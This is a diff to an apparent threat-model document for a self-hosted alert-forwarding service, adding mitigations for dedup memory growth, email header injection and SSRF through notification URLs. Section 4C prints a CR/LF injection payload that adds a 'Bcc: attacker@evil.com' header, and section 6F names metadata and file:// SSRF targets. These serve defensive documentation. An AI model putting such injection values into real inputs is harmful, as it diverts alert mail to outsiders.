@@ -122,6 +122,8 @@ Patterns:
 
 **Limitation:** Dedup cache is per-worker. With Gunicorn multi-worker mode, simultaneous identical requests across workers will both be processed. This is acceptable for homelab use — goal is rate reduction, not exactly-once delivery.
 
+**Additional mitigation (memory bound):** Cache is capped at 10,000 entries. Under a unique-payload flood (all different service/message combinations), TTL pruning alone would not bound growth. If the cache exceeds 10,000 entries after pruning, the oldest entry is evicted to make room — trading dedup accuracy for bounded memory. (`app/webhook.py` — `_DEDUP_MAX_SIZE`)
+
 ---
 
 ### 1D. Content Injection via Alert Fields
@@ -323,13 +325,40 @@ text = re.sub(r'<[@!][^>]+>', '', text)
 
 ---
 
-### 4C. Link Injection
+### 4C. Email Header Injection
+
+**What the attacker does:** Embeds CR/LF characters (`\r\n`) in a monitored service name or status field. In SMTP, headers are terminated by `\r\n` — a newline in the Subject line ends that header and starts the next one, allowing an attacker to inject arbitrary headers such as `Bcc:`, `From:`, `Content-Type:`, or `MIME-Version:`.
+
+Example payload:
+```
+service_name = "nginx\r\nBcc: attacker@evil.com\r\nX-Injected: yes"
+```
+This would turn the Subject header into:
+```
+Subject: 🔴 [CRITICAL] nginx
+Bcc: attacker@evil.com
+X-Injected: yes
+ — DOWN
+```
+
+**Implemented mitigation:**
+| Mitigation | Location |
+|---|---|
+| `_build_subject()` strips `\r` and `\n` from the composed subject line | `app/email_client.py` — `.replace("\r", " ").replace("\n", " ")` |
+
+**Note:** `smtplib` in Python 3.x also validates headers internally, but explicit stripping at the application layer provides defense-in-depth regardless of the SMTP library version.
+
+---
+
+### 4D. Link Injection
 
 **What the attacker does:** Injects malicious URLs into alert content that are forwarded to notification channels.
 
 **Partially mitigated:** HTML-escaped platforms (Telegram, Email, Matrix) will not render injected `<a href>` tags. Discord embed fields do not auto-link arbitrary text. Slack Block Kit plain_text sections do not render Markdown links.
 
 **Not implemented:** URL validation, denylist for known-malicious domains, or "[unverified link]" disclaimers. If your alert sources are fully trusted, this is low priority.
+
+---
 
 ---
 
@@ -366,6 +395,7 @@ Classic example: `requests.HTTPError.__str__()` includes the full request URL. F
 | `SENTINEL_DEBUG=true` documentation warns against production use | `app/__init__.py`, `.secrets.env.example` |
 | iMessage password passed in JSON request body, not URL query string — prevents credential appearing in Bluebubbles server access logs | `app/imessage_client.py` |
 | `GEMINI_TOKEN` redacted in exception log path where it could appear in URL | `app/gemini_client.py` — `safe_msg = str(exc).replace(token, "***")` |
+| Signal/WhatsApp phone numbers never included in `RuntimeError` messages — logged separately at `WARNING` so failures are visible without propagating numbers to callers | `app/signal_client.py`, `app/whatsapp_client.py` |
 
 **Gap — GEMINI_TOKEN in debug traceback frames (Informational):** The token redaction covers the `requests.RequestException` path. If the token appeared in a different exception type reaching the bare `except Exception` handler, `logger.exception("Unexpected AI error")` would log the full traceback — and under some Python logging configurations, local variable values appear in tracebacks. This is theoretical under normal operation. It becomes relevant if `SENTINEL_DEBUG=true` is left enabled long-term, since debug mode increases verbosity of logged context. Never run `SENTINEL_DEBUG=true` in a persistent production deployment.
 
@@ -385,6 +415,8 @@ Examples:
 |---|---|
 | Details dict truncated — limits how much context is forwarded | `app/gemini_client.py` — `_truncate_details()` |
 | Field caps at 500 chars — long tokens get cut | `app/gemini_client.py` — `_FIELD_MAX` |
+| Generic parser strips credential fields by exact key name | `app/alert_parser.py` — `_SENSITIVE_KEYS` set (password, token, secret, key, auth, etc.) |
+| Generic parser strips compound credential fields by substring match | `app/alert_parser.py` — `_SENSITIVE_SUBSTRINGS` (catches bearer_token, oauth_token, client_secret, app_secret, user_password, etc.) |
 
 **Not implemented:** Pattern-based redaction (JWT tokens, API key patterns, email addresses, private IPs). For high-sensitivity environments, add a redaction step in `alert_parser.py` before normalization.
 
@@ -501,19 +533,28 @@ This is not a Sentinel-specific risk — it applies to any Docker deployment.
 
 ### 6F. SSRF via Unvalidated URL Environment Variables
 
-**Risk:** Five notification clients construct outbound HTTP request URLs directly from operator-set environment variables with no scheme or host validation:
+**Risk:** Notification clients construct outbound HTTP request URLs directly from operator-set environment variables. Without validation, a modified URL value becomes an SSRF vector — the `requests` library will follow any scheme including `file://`, `http://169.254.169.254/` (cloud metadata), or internal services not otherwise reachable from outside Docker.
 
-| Variable | Client | URL construction |
-|---|---|---|
-| `SIGNAL_API_URL` | `signal_client.py:76` | `f"{api_url}/v2/send"` |
-| `GOTIFY_URL` | `gotify_client.py:65` | `f"{url}/message?token=..."` |
-| `NTFY_URL` | `ntfy_client.py:65` | Used directly as POST target |
-| `IMESSAGE_URL` | `imessage_client.py:68` | `f"{url}/api/v1/message"` |
-| `MATRIX_HOMESERVER` | `matrix_client.py:87` | `f"{homeserver}/_matrix/..."` |
+All seven clients that read URLs from environment variables are covered:
 
-In a standard homelab deployment these are operator-set values and the risk is low. In any shared, multi-tenant, or externally-managed deployment — or if the `.secrets.env` file is writable by a less-trusted process — a modified URL value becomes an SSRF vector. The `requests` library will follow any scheme including `file://`, `http://169.254.169.254/` (cloud metadata), or internal services not otherwise reachable from outside Docker.
+| Variable | Client |
+|---|---|
+| `SIGNAL_API_URL` | `signal_client.py` |
+| `GOTIFY_URL` | `gotify_client.py` |
+| `NTFY_URL` | `ntfy_client.py` |
+| `IMESSAGE_URL` | `imessage_client.py` |
+| `MATRIX_HOMESERVER` | `matrix_client.py` |
+| `DISCORD_WEBHOOK_URL` | `discord_client.py` |
+| `SLACK_WEBHOOK_URL` | `slack_client.py` |
 
-**Implemented fix:** `app/utils.py` exposes `_validate_url(url, env_var)` which rejects any scheme other than `http` or `https` and logs a warning. Applied at call time in all five affected clients before any HTTP request is made.
+**Implemented fix:** `app/utils.py` — `_validate_url(url, env_var)` rejects:
+- Non-http/https schemes (`file://`, `ftp://`, etc.)
+- Loopback addresses: `localhost`, `127.x.x.x`, `::1`, `0.0.0.0`
+- Link-local / cloud metadata: `169.254.x.x` (AWS/GCP/Azure instance metadata)
+
+RFC1918 ranges (`192.168.x.x`, `10.x.x.x`, `172.16–31.x.x`) are intentionally **allowed** — all internal notification backends (Gotify, ntfy, Signal CLI, Bluebubbles) run on the LAN.
+
+Applied at call time in all seven clients before any HTTP request is made.
 
 **Severity in homelab context:** Low — env vars are operator-controlled.
 **Severity in shared deployment:** Medium.
@@ -621,13 +662,18 @@ These are emerging or theoretical attack surfaces relevant to this architecture:
 | Pattern-based secret redaction | ⚠️ Recommended | Add to `alert_parser.py` for sensitive deployments |
 | `@everyone` / `@here` mention stripping | ✅ Implemented | Zero-width space in `discord_client.py`; `_strip_mentions()` in `slack_client.py` |
 | `<@USERID>` / `<@&ROLEID>` mention stripping | ✅ Implemented | `_USER_MENTION_RE` regex in `discord_client.py` and `slack_client.py` — see 4B |
-| URL env var scheme validation (SSRF) | ✅ Implemented | `_validate_url()` in `app/utils.py`, applied to all five affected clients — see 6F |
+| Email subject header injection | ✅ Implemented | `_build_subject()` strips `\r`/`\n` from service name — see 4C |
+| URL env var scheme + host validation (SSRF) | ✅ Implemented | `_validate_url()` in `app/utils.py`, applied to all 7 clients — see 6F |
+| Generic parser exact credential key filter | ✅ Implemented | `_SENSITIVE_KEYS` set in `app/alert_parser.py` — see 5C |
+| Generic parser compound credential key filter | ✅ Implemented | `_SENSITIVE_SUBSTRINGS` substring match in `app/alert_parser.py` (bearer_token, client_secret, etc.) — see 5C |
+| Phone numbers in Signal/WhatsApp error paths | ✅ Implemented | Logged separately; `RuntimeError` contains only error code — see 5B |
+| Dedup cache hard memory cap | ✅ Implemented | `_DEDUP_MAX_SIZE = 10_000` in `app/webhook.py`; evicts oldest on overflow — see 1C |
 | Generic parser prompt injection surface | ⚠️ Known limitation | Wider than named parsers; mitigated by `WEBHOOK_SECRET` and field caps — see 1D |
 | URL validation in AI output | ⚠️ Recommended | Low priority for trusted networks |
 | Non-root container user | ⚠️ Recommended | Add `USER 1000` to Dockerfile |
 | Alert state machine | ❌ Out of scope | Use monitoring tool natively |
 | Per-source rate limiting | ❌ Out of scope | Requires persistent storage |
-| E2E encryption of alerts in transit | ❌ Out of scope | TLS at Caddy/Nginx; alert data plaintext without it — see 6F |
+| E2E encryption of alerts in transit | ❌ Out of scope | TLS at Caddy/Nginx; alert data plaintext without it — see 6G |
 | `docker inspect` credential exposure | ❌ Out of scope | Restrict `docker` group membership; see 6D |
 | Docker group = effective root | ⚠️ Recommended | Use rootless Docker for service accounts; see 6E |
 | `WEBHOOK_RATE_LIMIT` per-worker (not global) | ⚠️ Known limitation | Use Nginx `limit_req` for global enforcement; see Known Limitations |
